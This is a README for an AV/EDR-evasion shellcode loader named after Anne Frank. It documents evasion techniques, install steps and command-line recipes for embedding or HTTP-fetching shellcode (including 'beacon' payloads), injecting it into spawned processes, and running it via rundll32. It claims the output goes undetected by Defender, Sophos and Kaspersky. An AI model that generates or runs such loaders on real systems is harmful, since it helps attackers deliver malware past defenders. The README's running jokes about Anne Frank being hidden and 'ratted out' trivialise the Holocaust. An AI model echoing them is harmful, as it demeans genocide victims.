# AnneFrankInjector

<img width="681" height="381" alt="image" src="https://github.com/user-attachments/assets/a119f8b0-374c-4f26-813d-bb282e6decef" />

> [!TIP]
> Did AnneFrankInjector help you hide your shellcode during a penetration test or while pwning a cert exam? If so, please consider giving it a star ⭐!

## Table of Contents

- [AnneFrankInjector](#annefrankinjector)
- [Goal](#goal)
- [General Information](#general-information)
- [Evasion Features](#evasion-features)
- [Installation](#installation)
  - [Prerequisites](#prerequisites)
  - [Install AnneFrankInjector](#install-annefrankinjector)
- [Usage](#usage)
  - [Graphical Interface](#graphical-interface-recommended)
  - [Command-line Interface](#command-line-interface)
- [Examples](#examples)
- [To-Do](#to-do)
- [Detections](#detections)
- [Credits - References](#credits---references)

## Goal

This repository was created to facilitate AV/EDR evasion during CTFs and red team engagements. The goal is to focus more on pwning rather than struggling with detection!

Your shellcode hides better than Anne Frank in the annex – until some nosy neighbor (Defender) rats it out.

Check out my blog post for more infos: [Evade Modern AVs in 2026](#)

## General Information

> [!CAUTION]
> This tool is designed for authorized operations only.

> [!NOTE]
> - The techniques used in the loader are nothing new. The loader generated from this packer will probably NOT evade modern AVs / EDRs long-term. Do not expect miracles – she still gets discovered after ~2 years.
> - Most of the evasion techniques used here are NOT from me. I just crammed a bunch of known tricks together like hiding them in an attic.
> - Depending on the interest shown to this project, I might add some techniques from my own research and maybe rewrite the whole thing into a much more capable injector.

## Evasion Features

- **Stageless**: Shellcode embedded directly into the loader.
- **Staged**: Shellcode fetched via HTTP (encrypted on the fly).
- **Evasion**:  
  - Indirect syscalls (Syswhispers)  
  - API hashing (Djb2)  
  - NTDLL unhooking (KnownDLLs)  
  - AES-128-CBC encryption  
  - EarlyBird APC injection  
    - **New:** Spawn injection – create a new process (e.g., notepad.exe) and inject into it (reliable, evades detection)  
    - **New:** Custom target process – inject into any process name (not just RuntimeBroker/svchost)  
  - **New:** Delay before injection – evade sandboxes with short timeouts  
  - Function/variable name scrambling (`-s`)
- **Output**: EXE or DLL (exported function `af`).
- **Code signing**: Optional with a PFX certificate.
- **GUI**: All options available through a user-friendly `tkinter` interface.

## Installation

### Prerequisites

- **Python 3.8+** and `pip`
- **MinGW‑w64** cross‑compiler (to build Windows executables)
- **NASM** (for assembly code)
- **osslsigncode** (optional, for signing)

**On Kali / Debian‑based Linux:**

```bash
sudo apt update
sudo apt install clang mingw-w64 nasm lld osslsigncode
```

**On Windows:**  
Install [MSYS2](https://www.msys2.org/), then in its terminal:

```bash
pacman -Syu
pacman -S mingw-w64-x86_64-clang make nasm
```

### Install AnneFrankInjector

#### Linux (Kali / Debian‑based)

1. **Clone the repository** and enter the folder:

   ```bash
   git clone https://github.com/Excalibra/AnneFrankInjector.git
   cd AnneFrankInjector
   ```

2. **Create a virtual environment** and install dependencies:

   ```bash
   python3 -m venv env
   source env/bin/activate
   pip install -r Linux/requirements.txt
   ```

3. **Run the GUI** (from the root folder):

   ```bash
   python af.py
   ```

   For command‑line usage, go into the `Linux` folder:

   ```bash
   cd Linux
   python main.py -h
   ```

4. **Optional – global CLI installation** (makes `afpacker` available system‑wide):

   ```bash
   pipx install .
   ```

#### Windows

1. **Clone the repository** and enter the folder:

   ```cmd
   git clone https://github.com/Excalibra/AnneFrankInjector.git
   cd AnneFrankInjector
   ```

2. **Create a virtual environment** and install dependencies:

   ```cmd
   python -m venv env
   env\Scripts\activate
   pip install -r Windows\requirements.txt
   ```

3. **Run the GUI** (from the root folder):

   ```cmd
   python af.py
   ```

   For command‑line usage, go into the `Windows` folder:

   ```cmd
   cd Windows
   python main.py -h
   ```

4. **Optional – global CLI installation** (makes `afpacker` available system‑wide):

   ```cmd
   pipx install .
   ```

> **Note:** The GUI (`af.py`) uses `tkinter` (built‑in with Python). No extra install needed.

## Usage

### Graphical Interface (Recommended)

Run the GUI from the project root:

```bash
python af.py
```

The window lets you:
- Select your raw shellcode file (`.bin`).
- Choose between **Stageless** (embed) or **Staged** (HTTP download).
- Set options like encryption, scrambling, output format (EXE/DLL), APC target, **delay**, and **spawn injection** (with custom process path).
- Click **Generate Loader** – the output appears in the text area and the loader is saved in the current folder.

<img width="720" height="745" alt="image" src="https://github.com/user-attachments/assets/02785532-3350-414c-8a91-728d1511bd95" />


### Command-line Interface

After installation (or from the `Linux` folder), you can use the `afpacker` command (or `python main.py`). The syntax is similar to the original CTFPacker.

#### Stageless (embed shellcode)

```bash
afpacker stageless -p payload.bin -e -s -o myloader [--delay 5] [--spawn] [--spawn-path "C:\\Windows\\System32\\notepad.exe"]
```

- `-p` : raw shellcode file
- `-e` : encrypt the shellcode
- `-s` : scramble function/variable names
- `-o` : output filename (without extension; default `afloader`)
- `-f DLL` : build a DLL instead of EXE
- `--delay` : seconds to wait before injection (default 0)
- `--spawn` : use spawn injection (create a new process)
- `--spawn-path` : path to executable to spawn (default: `C:\Windows\System32\notepad.exe`)

#### Staged (fetch shellcode via HTTP)

```bash
afpacker staged -p payload.bin -i 192.168.1.10 -po 8080 -pa /shellcode.bin -e -s -o myloader
```

- `-i` : IP address of the HTTP server
- `-po` : port
- `-pa` : path on the server (e.g., `/shellcode.bin`)
- `--delay`, `--spawn`, `--spawn-path` also work with staged (though the staged variant originally used `download.c` – ensure the templates support spawn injection as well).

#### Code signing

Add `-pfx cert.pfx -pfx-pass password` to any command to sign the output file.

#### Output format

Add `-f DLL` to produce a DLL. The exported function is named `af`. Execute it with:

```cmd
rundll32.exe afloader.dll,af
```

## Examples

**Stageless, encrypted, scrambled EXE, with a 5-second delay:**

```bash
afpacker stageless -p calc.bin -e -s --delay 5
# Creates afloader.exe
```

**Stageless, spawn injection into notepad.exe, delay 10 seconds:**

```bash
afpacker stageless -p beacon.bin -e -s --spawn --spawn-path "C:\\Windows\\System32\\notepad.exe" --delay 10 -o beacon
```

**Staged DLL, custom output name, with spawn injection:**

```bash
afpacker staged -p beacon.bin -i 10.0.0.5 -po 80 -pa /payload.bin -f DLL -o beacon --spawn --spawn-path "C:\\Windows\\System32\\calc.exe"
```

## To-Do

- [x] Setup.py / pipx support
- [x] Delay before injection
- [x] Spawn injection (new process)
- [x] Custom APC target (any process name)
- [ ] Advanced persistence features (e.g., scheduled task, registry, WMI)
- [ ] AMSI / ETW bypass (because even the diary needs silencing)
- [ ] More injection techniques (maybe "Betrayed by Neighbor" self-delete)

## Detections

- Undetected on the latest Windows 11 Defender (with delay + spawn injection)
- Undetected on Windows 10 Defender
- Undetected on Sophos, Kaspersky, etc.

## Credits - References

Most of the code is not from me. Here are the original authors (now properly credited under the new project):

```
@ Excalibra         - Main developer, attic architect, and professional snitch-hater
@ Maldevacademy     - https://maldevacademy.com
@ SaadAhla          - https://github.com/SaadAhla/ntdlll-unhooking-collection
@ VX-Underground    - https://github.com/vxunderground/VX-API/blob/main/VX-API/GetProcAddressDjb2.cpp
@ klezVirus         - https://github.com/klezVirus/SysWhispers3
```
